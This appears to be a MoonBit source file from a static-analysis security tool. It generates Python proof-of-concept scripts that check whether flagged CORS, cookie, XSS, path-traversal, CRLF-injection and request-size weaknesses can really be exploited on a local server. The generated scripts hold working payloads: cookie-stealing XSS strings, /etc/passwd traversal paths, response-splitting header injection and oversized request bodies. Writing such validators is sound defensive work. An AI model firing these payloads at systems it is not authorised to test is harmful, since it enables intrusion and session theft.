// PoC (Proof of Concept) template generation for verified vulnerabilities.
// Generates executable exploit scripts from static analysis findings
// to validate whether a vulnerability is actually exploitable at runtime.

///|
pub(all) enum PoCType {
  HttpRequest
  RawSocket
  BrowserBased
  CLICommand
}

///|
pub(all) struct PoCTemplate {
  finding : Finding
  poc_type : PoCType
  title : String
  description : String
  prerequisites : Array[String]
  attack_steps : Array[String]
  script : String
  expected_result : String
  cwe_url : String
}

///|
pub fn generate_poc(
  finding : Finding,
  _imports : ImportContext,
) -> PoCTemplate? {
  let rule_id = rule_id_str(finding.rule_id)
  if rule_id == "CWE-942/cors-credentials" {
    Some(generate_cors_poc(finding))
  } else if rule_id == "CWE-614/cookie-attrs" {
    Some(generate_cookie_poc(finding))
  } else if rule_id == "CWE-770/no-body-limit" {
    Some(generate_dos_poc(finding))
  } else if rule_id == "CWE-79/cmark-unsafe" {
    Some(generate_cmark_xss_poc(finding))
  } else if rule_id == "CWE-116/replace-escaping" {
    Some(generate_replace_xss_poc(finding))
  } else if rule_id == "CWE-94/eval-extern" {
    Some(generate_eval_poc(finding))
  } else if rule_id == "CWE-22/path-concat" {
    Some(generate_traversal_poc(finding))
  } else if rule_id == "CWE-346/ws-origin" {
    Some(generate_ws_hijack_poc(finding))
  } else if rule_id == "CWE-79/inner-html" {
    Some(generate_inner_html_poc(finding))
  } else if rule_id == "CWE-113/crlf-injection" {
    Some(generate_crlf_poc(finding))
  } else if rule_id == "CWE-79/template-injection" {
    Some(generate_template_xss_poc(finding))
  } else {
    None
  }
}

///|
pub fn generate_all_pocs(
  findings : Array[Finding],
  imports : ImportContext,
) -> Array[PoCTemplate] {
  let pocs : Array[PoCTemplate] = []
  for f in findings {
    match generate_poc(f, imports) {
      Some(poc) => pocs.push(poc)
      None => ()
    }
  }
  pocs
}

///|
fn generate_cors_poc(finding : Finding) -> PoCTemplate {
  let script = build_cors_script(finding)
  {
    finding,
    poc_type: HttpRequest,
    title: "CORS Credential Theft",
    description: "Verifies that the server reflects arbitrary Origin headers with credentials=true, allowing cross-origin credential theft.",
    prerequisites: ["Target server running", "Python 3.8+"],
    attack_steps: [
      "Send preflight OPTIONS request with evil.com Origin", "Verify Access-Control-Allow-Origin reflects evil.com",
      "Verify Access-Control-Allow-Credentials is true", "Send authenticated GET to sensitive endpoint",
      "Verify response data is readable cross-origin",
    ],
    script,
    expected_result: "Access-Control-Allow-Origin reflects attacker's Origin with Allow-Credentials: true",
    cwe_url: "https://cwe.mitre.org/data/definitions/942.html",
  }
}

///|
fn build_cors_script(finding : Finding) -> String {
  let buf = StringBuilder::new()
  buf.write_string("#!/usr/bin/env python3\n")
  buf.write_string("\"\"\"CORS Credential Theft PoC - ")
  buf.write_string(finding.file)
  buf.write_string(":")
  buf.write_string(finding.line.to_string())
  buf.write_string("\"\"\"\n")
  buf.write_string("import http.client\n\n")
  buf.write_string("TARGET = \"localhost\"\n")
  buf.write_string("PORT = 19002  # adjust to target port\n")
  buf.write_string("EVIL_ORIGIN = \"https://evil.com\"\n\n")
  buf.write_string(
    "conn = http.client.HTTPConnection(TARGET, PORT, timeout=5)\n\n",
  )
  buf.write_string("# Phase 1: Preflight probe\n")
  buf.write_string("conn.request(\"OPTIONS\", \"/\", headers={\n")
  buf.write_string("    \"Origin\": EVIL_ORIGIN,\n")
  buf.write_string("    \"Access-Control-Request-Method\": \"GET\"\n")
  buf.write_string("})\n")
  buf.write_string("resp = conn.getresponse()\n")
  buf.write_string("resp.read()\n")
  buf.write_string(
    "acao = dict(resp.getheaders()).get(\"access-control-allow-origin\", \"\")\n",
  )
  buf.write_string(
    "acac = dict(resp.getheaders()).get(\"access-control-allow-credentials\", \"\")\n",
  )
  buf.write_string("print(f\"ACAO: {acao}\")\n")
  buf.write_string("print(f\"ACAC: {acac}\")\n\n")
  buf.write_string("if acao == EVIL_ORIGIN and acac.lower() == \"true\":\n")
  buf.write_string(
    "    print(\"[VULNERABLE] Origin reflected with credentials\")\n",
  )
  buf.write_string("else:\n")
  buf.write_string("    print(\"[SAFE] CORS properly configured\")\n")
  buf.to_string()
}

///|
fn generate_cookie_poc(finding : Finding) -> PoCTemplate {
  let script = build_cookie_script(finding)
  {
    finding,
    poc_type: HttpRequest,
    title: "Session Cookie Theft via Missing Security Attributes",
    description: "Verifies cookies are set without HttpOnly/Secure/SameSite, enabling JavaScript-based session theft.",
    prerequisites: ["Target server running", "Python 3.8+"],
    attack_steps: [
      "Request endpoint that sets cookies", "Inspect Set-Cookie headers for security attributes",
      "Verify HttpOnly, Secure, and SameSite are absent", "Demonstrate cookie accessible via document.cookie",
    ],
    script,
    expected_result: "Set-Cookie headers lack HttpOnly, Secure, and SameSite attributes",
    cwe_url: "https://cwe.mitre.org/data/definitions/614.html",
  }
}

///|
fn build_cookie_script(finding : Finding) -> String {
  let buf = StringBuilder::new()
  buf.write_string("#!/usr/bin/env python3\n")
  buf.write_string("\"\"\"Cookie Security Audit PoC - ")
  buf.write_string(finding.file)
  buf.write_string(":")
  buf.write_string(finding.line.to_string())
  buf.write_string("\"\"\"\n")
  buf.write_string("import http.client\n\n")
  buf.write_string("TARGET = \"localhost\"\n")
  buf.write_string("PORT = 19002\n\n")
  buf.write_string(
    "conn = http.client.HTTPConnection(TARGET, PORT, timeout=5)\n",
  )
  buf.write_string("conn.request(\"GET\", \"/setcookie\")\n")
  buf.write_string("resp = conn.getresponse()\n")
  buf.write_string("resp.read()\n\n")
  buf.write_string("for k, v in resp.getheaders():\n")
  buf.write_string("    if k.lower() == \"set-cookie\":\n")
  buf.write_string("        print(f\"Cookie: {v}\")\n")
  buf.write_string("        missing = []\n")
  buf.write_string(
    "        if \"httponly\" not in v.lower(): missing.append(\"HttpOnly\")\n",
  )
  buf.write_string(
    "        if \"secure\" not in v.lower(): missing.append(\"Secure\")\n",
  )
  buf.write_string(
    "        if \"samesite\" not in v.lower(): missing.append(\"SameSite\")\n",
  )
  buf.write_string("        if missing:\n")
  buf.write_string(
    "            print(f\"  [VULNERABLE] Missing: {', '.join(missing)}\")\n",
  )
  buf.write_string("        else:\n")
  buf.write_string("            print(f\"  [SAFE] All attributes present\")\n")
  buf.to_string()
}

///|
fn generate_dos_poc(finding : Finding) -> PoCTemplate {
  let script = build_dos_script(finding)
  {
    finding,
    poc_type: HttpRequest,
    title: "Resource Exhaustion via Unbounded Request Body",
    description: "Verifies the server accepts arbitrarily large request bodies without size limits.",
    prerequisites: ["Target server running", "Python 3.8+"],
    attack_steps: [
      "Send progressively larger POST payloads (1KB to 10MB)", "Measure response times for degradation",
      "Attempt slowloris-style slow body attack",
    ],
    script,
    expected_result: "Server accepts payloads of any size without rejection",
    cwe_url: "https://cwe.mitre.org/data/definitions/770.html",
  }
}

///|
fn build_dos_script(finding : Finding) -> String {
  let buf = StringBuilder::new()
  buf.write_string("#!/usr/bin/env python3\n")
  buf.write_string("\"\"\"Resource Exhaustion PoC - ")
  buf.write_string(finding.file)
  buf.write_string(":")
  buf.write_string(finding.line.to_string())
  buf.write_string("\"\"\"\n")
  buf.write_string("import http.client, time\n\n")
  buf.write_string("TARGET = \"localhost\"\n")
  buf.write_string("PORT = 19002\n\n")
  buf.write_string("sizes = [1024, 10240, 102400, 1048576]\n")
  buf.write_string("for size in sizes:\n")
  buf.write_string("    payload = 'A' * size\n")
  buf.write_string(
    "    conn = http.client.HTTPConnection(TARGET, PORT, timeout=10)\n",
  )
  buf.write_string("    start = time.time()\n")
  buf.write_string("    try:\n")
  buf.write_string("        conn.request('POST', '/echo', body=payload)\n")
  buf.write_string("        resp = conn.getresponse()\n")
  buf.write_string("        resp.read()\n")
  buf.write_string("        elapsed = time.time() - start\n")
  buf.write_string(
    "        print(f\"{size:>8}B -> HTTP {resp.status} ({elapsed:.2f}s)\")\n",
  )
  buf.write_string("    except Exception as e:\n")
  buf.write_string("        print(f\"{size:>8}B -> ERROR: {e}\")\n")
  buf.write_string("    conn.close()\n")
  buf.to_string()
}

///|
fn generate_cmark_xss_poc(finding : Finding) -> PoCTemplate {
  {
    finding,
    poc_type: CLICommand,
    title: "Stored XSS via Unsafe Markdown Rendering",
    description: "Verifies that cmark render() with default safe=false passes through raw HTML and javascript: URLs.",
    prerequisites: ["cmark CLI built"],
    attack_steps: [
      "Render Markdown containing <script> tags", "Render Markdown containing javascript: URLs",
      "Compare output with safe=true vs safe=false",
    ],
    script: build_cmark_xss_script(finding),
    expected_result: "<script> tags and javascript: URLs appear in output without sanitization",
    cwe_url: "https://cwe.mitre.org/data/definitions/79.html",
  }
}

///|
fn build_cmark_xss_script(finding : Finding) -> String {
  let buf = StringBuilder::new()
  buf.write_string("#!/usr/bin/env python3\n")
  buf.write_string("\"\"\"cmark XSS PoC - ")
  buf.write_string(finding.file)
  buf.write_string("\"\"\"\n")
  buf.write_string("import subprocess\n\n")
  buf.write_string("payloads = [\n")
  buf.write_string("    'Normal text <script>alert(1)</script> more text',\n")
  buf.write_string("    '[click](javascript:alert(document.cookie))',\n")
  buf.write_string("    '<img src=x onerror=alert(1)>',\n")
  buf.write_string("]\n\n")
  buf.write_string("for p in payloads:\n")
  buf.write_string("    result = subprocess.run(\n")
  buf.write_string(
    "        ['moon', 'run', 'src/cmark_cli', '--target', 'native', '--', p],\n",
  )
  buf.write_string("        capture_output=True, text=True, timeout=10)\n")
  buf.write_string("    out = result.stdout\n")
  buf.write_string(
    "    if '<script>' in out or 'javascript:' in out or 'onerror=' in out:\n",
  )
  buf.write_string("        print(f'[VULNERABLE] {p[:40]}...')\n")
  buf.write_string("    else:\n")
  buf.write_string("        print(f'[SAFE] {p[:40]}...')\n")
  buf.to_string()
}

///|
fn generate_replace_xss_poc(finding : Finding) -> PoCTemplate {
  {
    finding,
    poc_type: CLICommand,
    title: "XSS via Incomplete HTML Escaping",
    description: "Demonstrates that String::replace() only escapes the first HTML metacharacter, leaving subsequent ones unescaped.",
    prerequisites: ["MoonBit toolchain"],
    attack_steps: [
      "Create test with multiple < characters in input", "Apply replace(old=\"<\", new=\"&lt;\") to input",
      "Verify only first < is replaced, rest remain raw",
    ],
    script: build_replace_poc_script(finding),
    expected_result: "Second and subsequent < characters remain unescaped in output",
    cwe_url: "https://cwe.mitre.org/data/definitions/116.html",
  }
}

///|
fn build_replace_poc_script(_finding : Finding) -> String {
  let buf = StringBuilder::new()
  buf.write_string("#!/usr/bin/env python3\n")
  buf.write_string("\"\"\"replace() vs replace_all() PoC\"\"\"\n")
  buf.write_string("# This demonstrates the MoonBit-specific behavior:\n")
  buf.write_string("# String::replace() only replaces the FIRST occurrence\n\n")
  buf.write_string("# Simulating MoonBit behavior:\n")
  buf.write_string(
    "input_str = '<script>alert(1)</script><img src=x onerror=alert(2)>'\n",
  )
  buf.write_string("# replace() - only first < is escaped:\n")
  buf.write_string("escaped_once = input_str.replace('<', '&lt;', 1)\n")
  buf.write_string("print(f'replace():     {escaped_once}')\n")
  buf.write_string("# replace_all() - all < are escaped:\n")
  buf.write_string("escaped_all = input_str.replace('<', '&lt;')\n")
  buf.write_string("print(f'replace_all(): {escaped_all}')\n\n")
  buf.write_string("if '<' in escaped_once:\n")
  buf.write_string(
    "    print('[VULNERABLE] replace() leaves unescaped HTML')\n",
  )
  buf.write_string("if '<' not in escaped_all:\n")
  buf.write_string(
    "    print('[SAFE] replace_all() escapes all occurrences')\n",
  )
  buf.to_string()
}

///|
fn generate_eval_poc(_finding : Finding) -> PoCTemplate {
  {
    finding: _finding,
    poc_type: CLICommand,
    title: "Code Injection via eval() in Extern JS",
    description: "Demonstrates that eval() in extern JS blocks can execute arbitrary code when given user-controlled input.",
    prerequisites: ["MoonBit JS target build"],
    attack_steps: [
      "Build project with --target js", "Locate eval() call in generated JS", "Demonstrate arbitrary code execution",
    ],
    script: "",
    expected_result: "eval() present in generated JS, executing injected code",
    cwe_url: "https://cwe.mitre.org/data/definitions/94.html",
  }
}

///|
fn generate_traversal_poc(finding : Finding) -> PoCTemplate {
  {
    finding,
    poc_type: RawSocket,
    title: "Directory Traversal via Path Concatenation",
    description: "Demonstrates path traversal by injecting ../ sequences into user-controlled path components.",
    prerequisites: ["Target server running", "Python 3.8+"],
    attack_steps: [
      "Identify path concatenation point", "Inject ../ sequences to escape web root",
      "Attempt to read /etc/passwd or other sensitive files",
    ],
    script: build_traversal_script(finding),
    expected_result: "Server returns content of files outside the intended directory",
    cwe_url: "https://cwe.mitre.org/data/definitions/22.html",
  }
}

///|
fn build_traversal_script(finding : Finding) -> String {
  let buf = StringBuilder::new()
  buf.write_string("#!/usr/bin/env python3\n")
  buf.write_string("\"\"\"Path Traversal PoC - ")
  buf.write_string(finding.file)
  buf.write_string("\"\"\"\n")
  buf.write_string("import socket\n\n")
  buf.write_string("TARGET = \"localhost\"\n")
  buf.write_string("PORT = 19002\n\n")
  buf.write_string("paths = [\n")
  buf.write_string("    '/../../../../../../etc/passwd',\n")
  buf.write_string("    '/../../../.git/config',\n")
  buf.write_string("    '/../../../.git/HEAD',\n")
  buf.write_string("]\n\n")
  buf.write_string("for path in paths:\n")
  buf.write_string(
    "    sock = socket.create_connection((TARGET, PORT), timeout=5)\n",
  )
  buf.write_string(
    "    req = f'GET {path} HTTP/1.1\\r\\nHost: {TARGET}:{PORT}\\r\\nConnection: close\\r\\n\\r\\n'\n",
  )
  buf.write_string("    sock.sendall(req.encode())\n")
  buf.write_string("    resp = b''\n")
  buf.write_string("    try:\n")
  buf.write_string("        while True:\n")
  buf.write_string("            chunk = sock.recv(4096)\n")
  buf.write_string("            if not chunk: break\n")
  buf.write_string("            resp += chunk\n")
  buf.write_string("    except socket.timeout: pass\n")
  buf.write_string("    sock.close()\n")
  buf.write_string(
    "    body = resp.decode(errors='replace').split('\\r\\n\\r\\n', 1)[-1]\n",
  )
  buf.write_string(
    "    if 'root:' in body or '[core]' in body or 'ref:' in body:\n",
  )
  buf.write_string(
    "        print(f'[VULNERABLE] {path} -> {len(body)} bytes')\n",
  )
  buf.write_string("    else:\n")
  buf.write_string("        print(f'[BLOCKED] {path}')\n")
  buf.to_string()
}

///|
fn generate_ws_hijack_poc(finding : Finding) -> PoCTemplate {
  {
    finding,
    poc_type: BrowserBased,
    title: "Cross-Site WebSocket Hijacking",
    description: "Demonstrates WebSocket connection from unauthorized origin due to missing Origin validation.",
    prerequisites: ["Target WebSocket server running"],
    attack_steps: [
      "Connect to WebSocket from evil.com origin", "Verify server accepts the connection",
      "Send/receive messages to demonstrate hijacking",
    ],
    script: "",
    expected_result: "WebSocket accepts connections from any origin",
    cwe_url: "https://cwe.mitre.org/data/definitions/346.html",
  }
}

///|
fn generate_inner_html_poc(_finding : Finding) -> PoCTemplate {
  {
    finding: _finding,
    poc_type: BrowserBased,
    title: "XSS via inner_html with Dynamic Content",
    description: "Demonstrates DOM-based XSS by injecting HTML through inner_html() with user-controlled content.",
    prerequisites: ["Browser with developer tools"],
    attack_steps: [
      "Identify inner_html sink with dynamic content", "Inject <img src=x onerror=alert(1)> payload",
      "Verify JavaScript execution in browser context",
    ],
    script: "",
    expected_result: "Injected JavaScript executes in the browser",
    cwe_url: "https://cwe.mitre.org/data/definitions/79.html",
  }
}

///|
pub fn format_poc_script(poc : PoCTemplate) -> String {
  if poc.script.length() > 0 {
    return poc.script
  }
  let buf = StringBuilder::new()
  buf.write_string("#!/usr/bin/env python3\n")
  buf.write_string("\"\"\"")
  buf.write_string(poc.title)
  buf.write_string("\n")
  buf.write_string(poc.description)
  buf.write_string("\n")
  buf.write_string("CWE: ")
  buf.write_string(poc.cwe_url)
  buf.write_string("\n\"\"\"\n\n")
  buf.write_string("# Attack steps:\n")
  for step in poc.attack_steps {
    buf.write_string("# - ")
    buf.write_string(step)
    buf.write_char('\n')
  }
  buf.write_string(
    "\nprint(\"Manual verification required for this PoC type\")\n",
  )
  buf.to_string()
}

///|
pub fn poc_type_str(t : PoCType) -> String {
  match t {
    HttpRequest => "http-request"
    RawSocket => "raw-socket"
    BrowserBased => "browser"
    CLICommand => "cli"
  }
}

///|
fn generate_crlf_poc(finding : Finding) -> PoCTemplate {
  {
    finding,
    poc_type: RawSocket,
    title: "HTTP Response Splitting via CRLF Injection",
    description: "Injects \\r\\n sequences into HTTP header values to split the response, enabling session fixation, cache poisoning, or XSS.",
    prerequisites: ["Target server running", "Python 3.8+"],
    attack_steps: [
      "Identify endpoint that reflects input in response headers", "Inject \\r\\n into a header value to create a second response",
      "Inject Set-Cookie header for session fixation", "Inject HTML body for reflected XSS via response splitting",
    ],
    script: build_crlf_script(finding),
    expected_result: "Injected CRLF characters cause HTTP response splitting: attacker-controlled headers or body appear in the response",
    cwe_url: "https://cwe.mitre.org/data/definitions/113.html",
  }
}

///|
fn build_crlf_script(finding : Finding) -> String {
  let buf = StringBuilder::new()
  buf.write_string("#!/usr/bin/env python3\n")
  buf.write_string("\"\"\"HTTP Response Splitting (CRLF Injection) PoC - ")
  buf.write_string(finding.file)
  buf.write_string(":")
  buf.write_string(finding.line.to_string())
  buf.write_string("\n")
  buf.write_string(
    "Tests whether the server sanitizes CRLF in header values.\n",
  )
  buf.write_string("A vulnerable server will reflect injected headers/body.\n")
  buf.write_string("\"\"\"\n")
  buf.write_string("import socket\n\n")
  buf.write_string("TARGET = \"localhost\"\n")
  buf.write_string("PORT = 19002  # adjust to target port\n\n")
  buf.write_string("# --- Test 1: Header injection via CRLF ---\n")
  buf.write_string("# Inject a fake Set-Cookie header for session fixation\n")
  buf.write_string("CRLF = \"\\r\\n\"\n")
  buf.write_string(
    "INJECT_HEADER = f\"benign-value{CRLF}Set-Cookie: session=attacker-controlled; Path=/\"\n\n",
  )
  buf.write_string("# --- Test 2: Full response splitting (XSS) ---\n")
  buf.write_string(
    "# Inject a complete second HTTP response with XSS payload\n",
  )
  buf.write_string("INJECT_BODY = (\n")
  buf.write_string("    f\"benign-value{CRLF}{CRLF}\"\n")
  buf.write_string(
    "    f\"<html><script>alert('XSS-via-CRLF')</script></html>\"\n",
  )
  buf.write_string(")\n\n")
  buf.write_string("# --- Test 3: Header injection via encoded CRLF ---\n")
  buf.write_string("INJECT_ENCODED = \"benign%0d%0aX-Injected: true\"\n\n")
  buf.write_string("test_payloads = [\n")
  buf.write_string("    (\"Raw CRLF header injection\", INJECT_HEADER),\n")
  buf.write_string("    (\"Response splitting with XSS\", INJECT_BODY),\n")
  buf.write_string("    (\"URL-encoded CRLF\", INJECT_ENCODED),\n")
  buf.write_string("]\n\n")
  buf.write_string("for name, payload in test_payloads:\n")
  buf.write_string("    print(f\"\\n[TEST] {name}\")\n")
  buf.write_string("    print(f\"  Payload: {repr(payload[:60])}\")\n")
  buf.write_string("    try:\n")
  buf.write_string(
    "        sock = socket.create_connection((TARGET, PORT), timeout=5)\n",
  )
  buf.write_string(
    "        # Send request with injected value in a custom header\n",
  )
  buf.write_string("        req = (\n")
  buf.write_string("            f\"GET / HTTP/1.1\\r\\n\"\n")
  buf.write_string("            f\"Host: {TARGET}:{PORT}\\r\\n\"\n")
  buf.write_string("            f\"X-Test-Input: {payload}\\r\\n\"\n")
  buf.write_string("            f\"Connection: close\\r\\n\"\n")
  buf.write_string("            f\"\\r\\n\"\n")
  buf.write_string("        )\n")
  buf.write_string("        sock.sendall(req.encode())\n")
  buf.write_string("        resp = b\"\"\n")
  buf.write_string("        while True:\n")
  buf.write_string("            chunk = sock.recv(4096)\n")
  buf.write_string("            if not chunk:\n")
  buf.write_string("                break\n")
  buf.write_string("            resp += chunk\n")
  buf.write_string("        sock.close()\n")
  buf.write_string("        decoded = resp.decode(errors=\"replace\")\n\n")
  buf.write_string("        # Check for evidence of injection\n")
  buf.write_string("        vulns = []\n")
  buf.write_string("        if \"Set-Cookie: session=attacker\" in decoded:\n")
  buf.write_string(
    "            vulns.append(\"Session fixation via injected Set-Cookie\")\n",
  )
  buf.write_string("        if \"X-Injected: true\" in decoded:\n")
  buf.write_string("            vulns.append(\"Arbitrary header injection\")\n")
  buf.write_string("        if \"XSS-via-CRLF\" in decoded:\n")
  buf.write_string(
    "            vulns.append(\"Response splitting with XSS payload\")\n",
  )
  buf.write_string("        if vulns:\n")
  buf.write_string(
    "            print(f\"  [VULNERABLE] {'; '.join(vulns)}\")\n",
  )
  buf.write_string("        else:\n")
  buf.write_string(
    "            print(\"  [SAFE] CRLF characters sanitized or not reflected\")\n",
  )
  buf.write_string("    except Exception as e:\n")
  buf.write_string("        print(f\"  [ERROR] {e}\")\n\n")
  buf.write_string("print(\"\\n\" + \"=\" * 50)\n")
  buf.write_string(
    "print(\"If any test shows [VULNERABLE], the server does not\")\n",
  )
  buf.write_string(
    "print(\"sanitize CRLF in header values. Attackers can:\")\n",
  )
  buf.write_string("print(\"  - Fixate sessions via injected Set-Cookie\")\n")
  buf.write_string("print(\"  - Poison caches with forged responses\")\n")
  buf.write_string("print(\"  - Execute XSS via response body injection\")\n")
  buf.to_string()
}

///|
fn generate_template_xss_poc(finding : Finding) -> PoCTemplate {
  {
    finding,
    poc_type: HttpRequest,
    title: "Reflected XSS via Template String Interpolation",
    description: "Demonstrates XSS by injecting HTML/JS through string interpolation in HTTP responses without output encoding.",
    prerequisites: ["Target server running", "Python 3.8+"],
    attack_steps: [
      "Identify endpoint that reflects user input via string interpolation", "Send request with XSS payload in query parameter or path",
      "Verify unescaped HTML appears in response body", "Demonstrate JavaScript execution in browser context",
    ],
    script: build_template_xss_script(finding),
    expected_result: "User input containing <script> tags is reflected unescaped in the HTML response",
    cwe_url: "https://cwe.mitre.org/data/definitions/79.html",
  }
}

///|
fn build_template_xss_script(finding : Finding) -> String {
  let buf = StringBuilder::new()
  buf.write_string("#!/usr/bin/env python3\n")
  buf.write_string("\"\"\"Reflected XSS via Template Interpolation PoC - ")
  buf.write_string(finding.file)
  buf.write_string(":")
  buf.write_string(finding.line.to_string())
  buf.write_string("\n")
  buf.write_string(
    "Tests whether user input is reflected in HTML responses without encoding.\n",
  )
  buf.write_string("\"\"\"\n")
  buf.write_string("import http.client\n")
  buf.write_string("from urllib.parse import quote\n\n")
  buf.write_string("TARGET = \"localhost\"\n")
  buf.write_string("PORT = 19002  # adjust to target port\n\n")
  buf.write_string("# XSS payloads of increasing sophistication\n")
  buf.write_string("payloads = [\n")
  buf.write_string(
    "    (\"Basic script tag\", \"<script>alert('XSS')</script>\"),\n",
  )
  buf.write_string(
    "    (\"Event handler\", \"<img src=x onerror=alert(document.domain)>\"),\n",
  )
  buf.write_string(
    "    (\"SVG onload\", \"<svg onload=alert(document.cookie)>\"),\n",
  )
  buf.write_string("    (\"Body onload\", '\"onmouseover=\"alert(1)'),\n")
  buf.write_string("]\n\n")
  buf.write_string("# Test common reflection points\n")
  buf.write_string("endpoints = [\n")
  buf.write_string("    \"/\",\n")
  buf.write_string("    \"/search\",\n")
  buf.write_string("    \"/user\",\n")
  buf.write_string("    \"/page\",\n")
  buf.write_string("]\n\n")
  buf.write_string("for ep in endpoints:\n")
  buf.write_string("    for name, payload in payloads:\n")
  buf.write_string(
    "        path = f\"{ep}?q={quote(payload)}&name={quote(payload)}\"\n",
  )
  buf.write_string("        try:\n")
  buf.write_string(
    "            conn = http.client.HTTPConnection(TARGET, PORT, timeout=5)\n",
  )
  buf.write_string("            conn.request(\"GET\", path)\n")
  buf.write_string("            resp = conn.getresponse()\n")
  buf.write_string(
    "            body = resp.read().decode(errors=\"replace\")\n",
  )
  buf.write_string("            conn.close()\n")
  buf.write_string(
    "            # Check if payload appears unescaped in response\n",
  )
  buf.write_string("            if payload in body:\n")
  buf.write_string(
    "                print(f\"[VULNERABLE] {ep} | {name}: payload reflected unescaped\")\n",
  )
  buf.write_string(
    "                print(f\"  Response snippet: ...{body[body.index(payload)-20:body.index(payload)+len(payload)+20]}...\")\n",
  )
  buf.write_string("            elif resp.status < 400:\n")
  buf.write_string(
    "                print(f\"[SAFE] {ep} | {name}: input encoded or not reflected\")\n",
  )
  buf.write_string("        except Exception as e:\n")
  buf.write_string("            pass  # endpoint doesn't exist, skip\n")
  buf.to_string()
}

///|
pub fn format_poc_report(pocs : Array[PoCTemplate]) -> String {
  let buf = StringBuilder::new()
  buf.write_string("# Generated PoC Templates\n\n")
  buf.write_string("| # | CWE | Type | Title | File |\n")
  buf.write_string("|---|-----|------|-------|------|\n")
  for i, poc in pocs {
    buf.write_string("| ")
    buf.write_string((i + 1).to_string())
    buf.write_string(" | ")
    buf.write_string(rule_id_str(poc.finding.rule_id))
    buf.write_string(" | ")
    buf.write_string(poc_type_str(poc.poc_type))
    buf.write_string(" | ")
    buf.write_string(poc.title)
    buf.write_string(" | ")
    buf.write_string(poc.finding.file)
    buf.write_string(":")
    buf.write_string(poc.finding.line.to_string())
    buf.write_string(" |\n")
  }
  buf.write_string("\n---\n\n")
  for i, poc in pocs {
    buf.write_string("## ")
    buf.write_string((i + 1).to_string())
    buf.write_string(". ")
    buf.write_string(poc.title)
    buf.write_string(" (")
    buf.write_string(rule_id_str(poc.finding.rule_id))
    buf.write_string(")\n\n")
    buf.write_string("**Type**: ")
    buf.write_string(poc_type_str(poc.poc_type))
    buf.write_char('\n')
    buf.write_string("**Expected Result**: ")
    buf.write_string(poc.expected_result)
    buf.write_char('\n')
    buf.write_string("**Reference**: ")
    buf.write_string(poc.cwe_url)
    buf.write_string("\n\n")
    if poc.script.length() > 0 {
      buf.write_string("```python\n")
      buf.write_string(poc.script)
      buf.write_string("\n```\n\n")
    }
  }
  buf.to_string()
}
